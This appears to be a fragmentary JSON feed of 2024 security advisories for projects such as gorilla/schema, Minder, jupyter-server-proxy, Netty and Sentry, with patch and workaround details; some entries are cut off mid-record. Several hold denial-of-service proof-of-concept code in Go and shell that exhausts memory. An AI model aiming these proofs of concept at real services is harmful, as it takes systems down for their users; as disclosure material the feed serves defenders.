            "details": "<b>Potential memory exhaustion attack due to sparse slice deserialization</b><br>### Details\n\nRunning `schema.Decoder.Decode()` on a struct that has a field of type `[]struct{...}` opens it up to malicious attacks regarding memory allocations, taking advantage of the sparse slice functionality. For instance, in the Proof of Concept written below, someone can specify to set a field of the billionth element and it will allocate all other elements before it in the slice. \n\nIn the local environment environment for my project, I was able to call an endpoint like `&#x2F;innocent_endpoint?arr.10000000.X=1` and freeze my system from the memory allocation while parsing `r.Form`. I think [this line](https:&#x2F;&#x2F;github.com&#x2F;gorilla&#x2F;schema&#x2F;blob&#x2F;main&#x2F;decoder.go#L223) is responsible for allocating the slice, although I haven&#x27;t tested to make sure, so it&#x27;s just an educated guess.\n\n### Proof of Concept\n\nThe following proof of concept works on both v1.2.0 and v1.2.1. I have not tested earlier versions.\n\n```go\npackage main\n\nimport (\n\t&quot;fmt&quot;\n\n\t&quot;github.com&#x2F;gorilla&#x2F;schema&quot;\n)\n\nfunc main() {\n\tdec := schema.NewDecoder()\n\tvar result struct {\n\t\tArr []struct{ Val int }\n\t}\n\tif err := dec.Decode(&amp;result, map[string][]string{&quot;arr.1000000000.Val&quot;: {&quot;1&quot;}}); err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Printf(&quot;%#+v\\n&quot;, result)\n}\n\n```\n\n### Impact\n\nAny use of `schema.Decoder.Decode()` on a struct with arrays of other structs could be vulnerable to this memory exhaustion vulnerability. There seems to be no possible solution that a developer using this library can do to disable this behaviour without fixing it in this project, so all uses of Decode that fall under this umbrella are affected. A fix that doesn&#x27;t require a major change may also be harder to find, since it could break compatibility with some other intended use-cases.\n",
            "published": "2024-07-01T20:35:12Z",
            "severity": "7.5",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3'>https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3</a></li><li>- <a target='_blank' href='https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff'>https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff</a></li><li>- <a target='_blank' href='https://github.com/gorilla/schema'>https://github.com/gorilla/schema</a></li><li>- <a target='_blank' href='https://github.com/gorilla/schema/blob/main/decoder.go#L223'>https://github.com/gorilla/schema/blob/main/decoder.go#L223</a></li></ul>"

            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-37904' target='_blank'>CVE-2024-37904</a>",
            "details": "<b></b><br>Minder is an open source Software Supply Chain Security Platform. Minder&#x27;s Git provider is vulnerable to a denial of service from a maliciously configured GitHub repository. The Git provider clones users repositories using the `github.com&#x2F;go-git&#x2F;go-git&#x2F;v5` library on lines `L55-L89`. The Git provider does the following on the lines `L56-L62`. First, it sets the `CloneOptions`, specifying the url, the depth etc. It then validates the options. It then sets up an in-memory filesystem, to which it clones and Finally, it clones the repository. The `(g *Git) Clone()` method is vulnerable to a DoS attack: A Minder user can instruct Minder to clone a large repository which will exhaust memory and crash the Minder server. The root cause of this vulnerability is a combination of the following conditions: 1. Users can control the Git URL which Minder clones, 2. Minder does not enforce a size limit to the repository, 3. Minder clones the entire repository into memory. This issue has been addressed in commit `7979b43` which has been included in release version v0.0.52. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
            "published": "2024-06-18T17:15:52Z",
            "severity": "0",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89'>https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62'>https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62</a></li></ul>"
        }, {
            "ecosystem": "Go",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-hpcg-xjq5-g666' target='_blank'>GHSA-hpcg-xjq5-g666</a>",
            "details": "<b>Minder affected by denial of service from maliciously configured Git repository</b><br>Minder&#x27;s Git provider is vulnerable to a denial of service from a maliciously configured GitHub repository. The Git provider clones users repositories using the `github.com&#x2F;go-git&#x2F;go-git&#x2F;v5` library on these lines:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;85985445c8ac3e51f03372e99c7b2f08a6d274aa&#x2F;internal&#x2F;providers&#x2F;git&#x2F;git.go#L55-L89\n\nThe Git provider does the following on these lines:\n\nFirst, it sets the `CloneOptions`, specifying the url, the depth etc:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;85985445c8ac3e51f03372e99c7b2f08a6d274aa&#x2F;internal&#x2F;providers&#x2F;git&#x2F;git.go#L56-L62\n\nIt then validates the options: \n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;85985445c8ac3e51f03372e99c7b2f08a6d274aa&#x2F;internal&#x2F;providers&#x2F;git&#x2F;git.go#L66-L68\n\nIt then sets up an in-memory filesystem, to which it clones:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;85985445c8ac3e51f03372e99c7b2f08a6d274aa&#x2F;internal&#x2F;providers&#x2F;git&#x2F;git.go#L70-L71\n\nFinally, it clones the repository:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;85985445c8ac3e51f03372e99c7b2f08a6d274aa&#x2F;internal&#x2F;providers&#x2F;git&#x2F;git.go#L77\n\nThis `(g *Git) Clone()` method is vulnerable to a DoS attack: A Minder user can instruct Minder to clone a large repository which will exhaust memory and crash the Minder server. The root cause of this vulnerability is a combination of the following conditions:\n\n1. Users can control the Git URL which Minder clones.\n2. Minder does not enforce a size limit to the repository.\n3. Minder clones the entire repository into memory.\n\n## PoC\nHere, we share a PoC of how the logic of `(g *Git) Clone()` behaves isolated from Minder. To get a true assessment of whether this is 100% identical to its behavior in the context of Minder instead of an isolated PoC, this should be tested out by creating a large repository and instructing Minder to clone it. However, even in that case, it might not be possible to deterministically trigger a DoS because of noise from network calls.\n\nWe believe the below PoC is a correct representation because:\n\n1. We have replicated the important and impactful parts of `(g *Git) Clone()`\n2. We run this in multiple goroutines which Minder does here: https:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;3afa50ef2e06269ed619d390d266cf1988c2068b&#x2F;internal&#x2F;engine&#x2F;executor.go#L128\n3. Minders timeout is set to 5 minutes: https:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;3afa50ef2e06269ed619d390d266cf1988c2068b&#x2F;internal&#x2F;engine&#x2F;executor.go#L114. With a reasonable connection, Minder can download many GBs in that period.\n\nIn our PoC, we demonstrate that under these two conditions, a large repository can perform a SigKill of the Go process which in Minders case is the Minder server.\n\nFirst, create a local Git repository:\n```\ncd &#x2F;tmp\nmkdir upstream-repo\ncd upstream-repo\ngit init --bare\ncd &#x2F;tmp\ngit clone &#x2F;tmp&#x2F;upstream-repo .&#x2F;upstream-repo-clone\ncd .&#x2F;upstream-repo-clone\n# Add large file:\nfallocate -l 8G large-file\ngit add .\ngit commit -m &quot;add large file&quot;\ngit push\ncd &#x2F;tmp\n```\n\nCreate and run the following script in `&#x2F;tmp&#x2F;dos-poc&#x2F;main.go`:\n\n```go\npackage main\n\nimport (\n        &quot;context&quot;\n        &quot;fmt&quot;\n        &quot;github.com&#x2F;go-git&#x2F;go-billy&#x2F;v5&#x2F;memfs&quot;\n        &quot;github.com&#x2F;go-git&#x2F;go-git&#x2F;v5&quot;\n        &quot;github.com&#x2F;go-git&#x2F;go-git&#x2F;v5&#x2F;storage&#x2F;memory&quot;\n        &quot;runtime&quot;\n        &quot;sync&quot;\n)\n\nfunc main() {\n        var (\n                wg  sync.WaitGroup\n        )\n\n        for i := 0; i &amp;lt; 2; i++ {\n                fmt.Println(&quot;Starting one...&quot;)\n                wg.Add(1)\n                go func() {\n                        defer wg.Done()\n                        opts := &amp;git.CloneOptions{\n                                URL:          &quot;&#x2F;tmp&#x2F;upstream-repo&quot;,\n                                SingleBranch: true,\n                                Depth:        1,\n                                Tags:         git.NoTags,\n                        }\n\n                        storer := memory.NewStorage()\n                        fs := memfs.New()\n                        git.CloneContext(context.Background(), storer, fs, opts)\n                }()\n        }\n        fmt.Println(&quot;Finished&quot;)\n        PrintMemUsage()\n        wg.Wait()\n\n}\n\nfunc PrintMemUsage() {\n        var m runtime.MemStats\n        runtime.ReadMemStats(&amp;m)\n        &#x2F;&#x2F; For info on each, see: https:&#x2F;&#x2F;golang.org&#x2F;pkg&#x2F;runtime&#x2F;#MemStats\n        fmt.Printf(&quot;Alloc = %v MiB&quot;, bToMb(m.Alloc))\n        fmt.Printf(&quot;\\tTotalAlloc = %v MiB&quot;, bToMb(m.TotalAlloc))\n        fmt.Printf(&quot;\\tSys = %v MiB&quot;, bToMb(m.Sys))\n        fmt.Printf(&quot;\\tNumGC = %v\\n&quot;, m.NumGC)\n}\n\nfunc bToMb(b uint64) uint64 {\n        return b &#x2F; 1024 &#x2F; 1024\n}\n```\n\nOn my local machine, this Go program is killed before it prints &quot;Finished&quot; in the terminal. Observing the memory by way of `top`, we can see that the memory climbs steadily until the program crashes around 93% memory consumption.",
            "published": "2024-06-18T16:34:24Z",
            "severity": "5.7",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/stacklok/minder/security/advisories/GHSA-hpcg-xjq5-g666'>https://github.com/stacklok/minder/security/advisories/GHSA-hpcg-xjq5-g666</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/commit/35bab8f9a6025eea9e6e3cef6bd80707ac03d2a9'>https://github.com/stacklok/minder/commit/35bab8f9a6025eea9e6e3cef6bd80707ac03d2a9</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/commit/7979b43'>https://github.com/stacklok/minder/commit/7979b43</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder'>https://github.com/stacklok/minder</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89'>https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62'>https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62</a></li></ul>"

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-35225' target='_blank'>CVE-2024-35225</a>",
            "details": "<b></b><br>Jupyter Server Proxy allows users to run arbitrary external processes alongside their notebook server and provide authenticated web access to them. Versions of 3.x prior to 3.2.4 and 4.x prior to 4.2.0 have a reflected cross-site scripting (XSS) issue. The `&#x2F;proxy` endpoint accepts a `host` path segment in the format `&#x2F;proxy&#x2F;&amp;lt;host&amp;gt;`. When this endpoint is called with an invalid `host` value, `jupyter-server-proxy` replies with a response that includes the value of `host`, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid `host` value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of `GET &#x2F;proxy&#x2F;&amp;lt;host&amp;gt;`, which runs the custom JavaScript contained in `host` set by the actor. As any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user&#x27;s JupyterLab instance for an actor. Patches are included in versions 4.2.0 and 3.2.4. As a workaround, server operators who are unable to upgrade can disable the `jupyter-server-proxy` extension.",
            "published": "2024-06-11T22:15:09Z",
            "severity": "0",
            "langs": "py",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328'>https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li></ul>"
        }, {
            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-fvcq-4x64-hqxr' target='_blank'>GHSA-fvcq-4x64-hqxr</a>",
            "details": "<b>Jupyter Server Proxy has a reflected XSS issue in host parameter</b><br>### Impact\n\nThere is a reflected cross-site scripting (XSS) issue in `jupyter-server-proxy`[1]. The `&#x2F;proxy` endpoint accepts a `host` path segment in the format `&#x2F;proxy&#x2F;&amp;lt;host&amp;gt;`. When this endpoint is called with an invalid `host` value, `jupyter-server-proxy` replies with a response that includes the value of `host`, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid `host` value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of `GET &#x2F;proxy&#x2F;&amp;lt;host&amp;gt;`, which runs the custom JavaScript contained in `host` set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user&#x27;s JupyterLab instance for an actor. This issue exists in the latest release of `jupyter-server-proxy`, currently `v4.1.2`.\n**Impacted versions:** `&amp;gt;=3.0.0,&amp;lt;=4.1.2`\n\n### Patches\n\nThe patches are included in `==4.2.0` and `==3.2.4`.\n\n### Workarounds\n\nServer operators who are unable to upgrade can disable the `jupyter-server-proxy` extension with:\n\n```\njupyter server extension disable jupyter-server-proxy\n```\n\n### References\n\n[1] : https:&#x2F;&#x2F;github.com&#x2F;jupyterhub&#x2F;jupyter-server-proxy&#x2F;\n[2] : https:&#x2F;&#x2F;github.com&#x2F;jupyterhub&#x2F;jupyter-server-proxy&#x2F;blob&#x2F;62a290f08750f7ae55a0c29ca339c9a39a7b2a7b&#x2F;jupyter_server_proxy&#x2F;handlers.py#L328\n",
            "published": "2024-06-11T21:12:47Z",
            "severity": "9.6",
            "langs": "py",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr'>https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr</a></li><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22'>https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22</a></li><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878'>https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878</a></li><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy'>https://github.com/jupyterhub/jupyter-server-proxy</a></li><li>- <a target='_blank' href='https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328'>https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li></ul>"

            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-36405' target='_blank'>CVE-2024-36405</a>",
            "details": "<b></b><br>liboqs is a C-language cryptographic library that provides implementations of post-quantum cryptography algorithms. A control-flow timing lean has been identified in the reference implementation of the Kyber key encapsulation mechanism when it is compiled with Clang 15-18 for `-Os`, `-O1`, and other compilation options. A proof-of-concept local attack on the reference implementation leaks the entire ML-KEM 512 secret key in ~10 minutes using end-to-end decapsulation timing measurements. The issue has been fixed in version 0.10.1. As a possible workaround, some compiler options may produce vectorized code that does not leak secret information, however relying on these compiler options as a workaround may not be reliable.",
            "published": "2024-06-10T13:15:50Z",
            "severity": "0",
            "langs": "c",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/open-quantum-safe/liboqs/blob/7eecda6095c003ddded7175a1ffdf35a2ce63ed5/src/kem/kyber/pqcrystals-kyber_kyber512_ref/poly.c#L166'>https://github.com/open-quantum-safe/liboqs/blob/7eecda6095c003ddded7175a1ffdf35a2ce63ed5/src/kem/kyber/pqcrystals-kyber_kyber512_ref/poly.c#L166</a></li></ul>"
        }, {
            "ecosystem": "npm",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-rpx8-fg6w-rm6x' target='_blank'>GHSA-rpx8-fg6w-rm6x</a>",
            "details": "<b>lunary-ai&#x2F;lunary XSS in SAML metadata endpoint</b><br>A Cross-site Scripting (XSS) vulnerability exists in the SAML metadata endpoint `&#x2F;auth&#x2F;saml&#x2F;${org?.id}&#x2F;metadata` of lunary-ai&#x2F;lunary version 1.2.7. The vulnerability arises due to the application&#x27;s failure to escape or validate the `orgId` parameter supplied by the user before incorporating it into the generated response. Specifically, the endpoint generates XML responses for SAML metadata, where the `orgId` parameter is directly embedded into the XML structure without proper sanitization or validation. This flaw allows an attacker to inject arbitrary JavaScript code into the generated SAML metadata page, leading to potential theft of user cookies or authentication tokens.",
            "published": "2024-06-06T21:30:37Z",
            "severity": "7.4",
            "langs": "ts",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/lunary-ai/lunary'>https://github.com/lunary-ai/lunary</a></li><li>- <a target='_blank' href='https://github.com/lunary-ai/lunary/blob/main/packages/backend/src/api/v1/auth/saml.ts#L34'>https://github.com/lunary-ai/lunary/blob/main/packages/backend/src/api/v1/auth/saml.ts#L34</a></li><li>- <a target='_blank' href='https://huntr.com/bounties/e899f496-d493-4c06-b596-cb0a88ad451b'>https://huntr.com/bounties/e899f496-d493-4c06-b596-cb0a88ad451b</a></li></ul>"
        }, {
            "ecosystem": "Maven",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-g762-h86w-8749' target='_blank'>GHSA-g762-h86w-8749</a>",
            "details": "<b>BoringSSLAEADContext in Netty Repeats Nonces</b><br>### Summary\nBoringSSLAEADContext keeps track of how many OHTTP responses have been sent and uses this sequence number to calculate the appropriate nonce to use with the encryption algorithm. \nUnfortunately, two separate errors combine which would allow an attacker to cause the sequence number to overflow and thus the nonce to repeat.\n\n### Details\n1. There is no overflow detection or enforcement of the maximum sequence value. (This is a missed requirement from the draft Chunked Oblivious OHTTP RFC and so should be inherited from the HPKE RFC 9180, Section 5.2).\n2. The sequence number (seq) is stored as 32-bit int which is relatively easy to overflow.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;netty&#x2F;netty-incubator-codec-ohttp&#x2F;blob&#x2F;1ddadb6473cd3be5491d114431ed4c1a9f316001&#x2F;codec-ohttp-hpke-classes-boringssl&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;netty&#x2F;incubator&#x2F;codec&#x2F;hpke&#x2F;boringssl&#x2F;BoringSSLAEADContext.java#L112-L114\n\n### Impact\nIf the BoringSSLAEADContext is used to encrypt more than 2^32 messages then the AES-GCM nonce will repeat.\nRepeating a nonce with AES-GCM results in both confidentiality and integrity compromise of data encrypted with the associated key.\n",
            "published": "2024-06-05T16:53:49Z",
            "severity": "5.9",
            "langs": "java",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/netty/netty-incubator-codec-ohttp/security/advisories/GHSA-g762-h86w-8749'>https://github.com/netty/netty-incubator-codec-ohttp/security/advisories/GHSA-g762-h86w-8749</a></li><li>- <a target='_blank' href='https://github.com/netty/netty-incubator-codec-ohttp'>https://github.com/netty/netty-incubator-codec-ohttp</a></li><li>- <a target='_blank' href='https://github.com/netty/netty-incubator-codec-ohttp/blob/1ddadb6473cd3be5491d114431ed4c1a9f316001/codec-ohttp-hpke-classes-boringssl/src/main/java/io/netty/incubator/codec/hpke/boringssl/BoringSSLAEADContext.java#L112-L114'>https://github.com/netty/netty-incubator-codec-ohttp/blob/1ddadb6473cd3be5491d114431ed4c1a9f316001/codec-ohttp-hpke-classes-boringssl/src/main/java/io/netty/incubator/codec/hpke/boringssl/BoringSSLAEADContext.java#L112-L114</a></li></ul>"

            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-c2g2-gx4j-rj3j' target='_blank'>GHSA-c2g2-gx4j-rj3j</a>",
            "details": "<b>Slack integration leaks sensitive information in logs</b><br>### Impact\nSentry&#x27;s Slack integration incorrectly records the incoming request body in logs. This request data can contain sensitive information, including the [deprecated Slack verification token](https:&#x2F;&#x2F;api.slack.com&#x2F;authentication&#x2F;verifying-requests-from-slack#deprecation). With this verification token, it is possible under specific configurations, an attacker can forge requests and act as the Slack integration.\n\nThe request body is leaked in log entries matching `event == &quot;slack.*&quot; &amp;&amp; name == &quot;sentry.integrations.slack&quot; &amp;&amp; request_data == *`. The deprecated slack verification token, will be found in the `request_data.token` key.\n\nExample event:\n\n```json\n{\n    &quot;name&quot;: &quot;sentry.integrations.slack&quot;,\n    &quot;level&quot;: &quot;info&quot;,\n    &quot;event&quot;: &quot;slack.event.message&quot;,  # This could be any of the `slack.*` events\n    &quot;request_data&quot;: {\n      # Other keys are omitted for brevity\n      &quot;token&quot;: &quot;&amp;lt;MyDeprecatedSlackVerificationToken&amp;gt;&quot;,\n    }\n}\n``` \n\n### Patches\n- **SaaS users** do not need to take any action.\n- **Self-hosted users** should upgrade to version 24.5.0 or higher, [rotate their Slack verification token](https:&#x2F;&#x2F;api.slack.com&#x2F;authentication&#x2F;verifying-requests-from-slack#regenerating), and [use the Slack Signing Secret instead of the verification token](https:&#x2F;&#x2F;develop.sentry.dev&#x2F;integrations&#x2F;slack&#x2F;).\n  - If you are only using the `slack.signing-secret` in your self-hosted configuration, then the legacy verification token is not used to verify the webhook payload. It is ignored. \n \n&amp;gt; \u26a0\ufe0f Sentry&#x27;s support for validating Slack requests via the legacy verification token will be deprecated in version 24.7.0.\n\n\n### Workarounds\n\n#### Option 1\n\nSet the `slack.signing-secret` instead of `slack.verification-token`. The [signing secret](https:&#x2F;&#x2F;api.slack.com&#x2F;authentication&#x2F;verifying-requests-from-slack#app-management-updates) is Slack&#x27;s recommended way of authenticating webhooks.\n\nBy having `slack.singing-secret` set, Sentry self-hosted will no longer use the verification token for authentication of the webhooks, regardless of whether `slack.verification-token` is set or not.\n\n#### Option 2\n\nThe deprecated Slack verification token is leaked in log levels of `INFO` and `ERROR` in the Slack integration. If the self-hosted instance is unable to be upgraded or re-configured to use the `slack.signing-secret`, the logging configuration can be adjusted to not generate logs from the integration. The [default logging configuration can be found in `src&#x2F;sentry&#x2F;conf&#x2F;server.py`](https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry&#x2F;blob&#x2F;17d2b87e39ccd57e11da4deed62971ff306253d1&#x2F;src&#x2F;sentry&#x2F;conf&#x2F;server.py#L1307). **Services should be restarted once the configuration change is saved.**\n\nBelow you&#x27;ll find an example of the configuration adjustments necessary to remove the Slack integration logs:\n \n```python\n# src&#x2F;sentry&#x2F;conf&#x2F;server.py\n\n...\n \nLOGGING: LoggingConfig = {\n    ...\n    handlers: {\n        # the line below already exists in the default configuration\n        &quot;null&quot;: {&quot;class&quot;: &quot;logging.NullHandler&quot;},\n        ...\n    },\n    &quot;loggers&quot;: {\n        &quot;sentry.integrations.slack&quot;: {\n            &quot;handlers&quot;: [&quot;null&quot;],  # route logs to null handler\n            &quot;level&quot;: &quot;CRITICAL&quot;,  # prevent generation of logs a lower levels (ex. ERROR and INFO)\n        },\n        ...\n    },\n}\n```\n\n### References\n- https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry&#x2F;pull&#x2F;70508\n- [Sentry Slack Integration Documentation for Self-Hosted users](https:&#x2F;&#x2F;develop.sentry.dev&#x2F;integrations&#x2F;slack&#x2F;)\n- [Documentation on Slack Signing Secrets](https:&#x2F;&#x2F;api.slack.com&#x2F;authentication&#x2F;verifying-requests-from-slack#app-management-updates)\n- [Slack Deprecation for Verification Tokens](https:&#x2F;&#x2F;api.slack.com&#x2F;authentication&#x2F;verifying-requests-from-slack#deprecation)\n",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/stormpath/stormpath-sdk-php/issues/132'>https://github.com/stormpath/stormpath-sdk-php/issues/132</a></li><li>- <a target='_blank' href='https://github.com/FriendsOfPHP/security-advisories/blob/master/stormpath/sdk/2017-11-20.yaml'>https://github.com/FriendsOfPHP/security-advisories/blob/master/stormpath/sdk/2017-11-20.yaml</a></li><li>- <a target='_blank' href='https://github.com/stormpath/stormpath-sdk-php'>https://github.com/stormpath/stormpath-sdk-php</a></li><li>- <a target='_blank' href='https://github.com/stormpath/stormpath-sdk-php/blob/15aee3007b8aa41c20cdf28fd650b8a2368a7fa9/src/Util/UUID.php#L167-L181'>https://github.com/stormpath/stormpath-sdk-php/blob/15aee3007b8aa41c20cdf28fd650b8a2368a7fa9/src/Util/UUID.php#L167-L181</a></li><li>- <a target='_blank' href='https://github.com/stormpath/stormpath-sdk-php/blob/62698ea98ef89217f932e28cf3e511d39af3b4cf/src/Authc/Api/ApiKeyEncryptionOptions.php#L48-L50'>https://github.com/stormpath/stormpath-sdk-php/blob/62698ea98ef89217f932e28cf3e511d39af3b4cf/src/Authc/Api/ApiKeyEncryptionOptions.php#L48-L50</a></li></ul>"

            "details": "<b>dbt allows Binding to an Unrestricted IP Address via socketsocket</b><br>### Summary\n\nBinding to `INADDR_ANY (0.0.0.0)` or `IN6ADDR_ANY (::)` exposes an application on all network interfaces, increasing the risk of unauthorized access.\n\nWhile doing some static analysis and code inspection, I found the following code binding a socket to `INADDR_ANY` by passing `&quot;&quot;` as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). \n\n### Details\n\nAs stated in the Python docs, a special form for address is accepted instead of a host address: `&#x27;&#x27;` represents `INADDR_ANY`, equivalent to `&quot;0.0.0.0&quot;`. On systems with IPv6, &#x27;&#x27; represents `IN6ADDR_ANY`, which is equivalent to `&quot;::&quot;`. \n\nhttps:&#x2F;&#x2F;github.com&#x2F;dbt-labs&#x2F;dbt-core&#x2F;blob&#x2F;main&#x2F;core&#x2F;dbt&#x2F;task&#x2F;docs&#x2F;serve.py#L23C38-L23C39\n\nThe text around this code also imply the intention is to host docs only on localhost.\n\n### PoC\n\nTo recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run `netstat` to see what addresses this process is bound.\n\n### Impact\n\nA user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user&#x2F;system to access on the same network.\n\nFurther references:\nhttps:&#x2F;&#x2F;docs.python.org&#x2F;3&#x2F;library&#x2F;socket.html#socket-families\nhttps:&#x2F;&#x2F;docs.securesauce.dev&#x2F;rules&#x2F;PY030\nhttps:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;1327.html\n\n### Patches\nThe issue has has been mitigated in [dbt-core v1.6.15](https:&#x2F;&#x2F;github.com&#x2F;dbt-labs&#x2F;dbt-core&#x2F;releases&#x2F;tag&#x2F;v1.6.15), [dbt-core v1.7.15](https:&#x2F;&#x2F;github.com&#x2F;dbt-labs&#x2F;dbt-core&#x2F;releases&#x2F;tag&#x2F;v1.7.15), and [dbt-core v1.8.1](https:&#x2F;&#x2F;github.com&#x2F;dbt-labs&#x2F;dbt-core&#x2F;releases&#x2F;tag&#x2F;v1.8.1) by binding to localhost explicitly by default in `dbt docs serve` (https:&#x2F;&#x2F;github.com&#x2F;dbt-labs&#x2F;dbt-core&#x2F;issues&#x2F;10209).\n",

            "details": "<b>Denial of service of Minder Server from maliciously crafted GitHub attestations</b><br>Minder is vulnerable to a denial-of-service (DoS) attack which could allow an attacker to crash the Minder server and deny other users access to it.\n\nThe root cause of the vulnerability is that Minders sigstore verifier reads an untrusted response entirely into memory without enforcing a limit on the response body. An attacker can exploit this by making Minder make a request to an attacker-controlled endpoint which returns a response with a large body which will crash the Minder server.\n\nSpecifically, the point of failure is where Minder parses the response from the GitHub attestations endpoint in `getAttestationReply`. Here, Minder makes a request to the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub endpoint (line 285) and then parses the response into the `AttestationReply` (line 295):\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;daccbc12e364e2d407d56b87a13f7bb24cbdb074&#x2F;internal&#x2F;verifier&#x2F;sigstore&#x2F;container&#x2F;container.go#L271-L300\n\nThe way Minder parses the response on line 295 makes it prone to DoS if the response is large enough. Essentially, the response needs to be larger than the machine has available memory.\n\nTo demonstrate this in an isolated way, consider the following example:\n\n```go\npackage main\n\nimport (\n        &quot;encoding&#x2F;json&quot;\n        &quot;fmt&quot;\n        &quot;io&quot;\n        &quot;strings&quot;\n)\n\ntype Attestation struct {\n        Bundle json.RawMessage `json:&quot;bundle&quot;`\n}\n\ntype AttestationReply struct {\n        Attestations []Attestation `json:&quot;attestations&quot;`\n}\n\nfunc main() {\n        m1 := strings.NewReader(&quot;{\\&quot;attestations\\&quot;:[&quot;)\n        maliciousBody := strings.NewReader(strings.Repeat(&quot;{\\&quot;bundle\\&quot;:{\\&quot;k\\&quot;: \\&quot;v\\&quot;{{,&quot;, 100000000))\n        m2 := strings.NewReader(&quot;{\\&quot;bundle\\&quot;:{\\&quot;k\\&quot;: \\&quot;v\\&quot;}}]}&quot;)\n        maliciousBodyReader := io.MultiReader(m1, maliciousBody, maliciousBody, maliciousBody, m2)\n        fmt.Println(&quot;Created malicious body&quot;)\n\n        var attestationReply AttestationReply\n        _ = 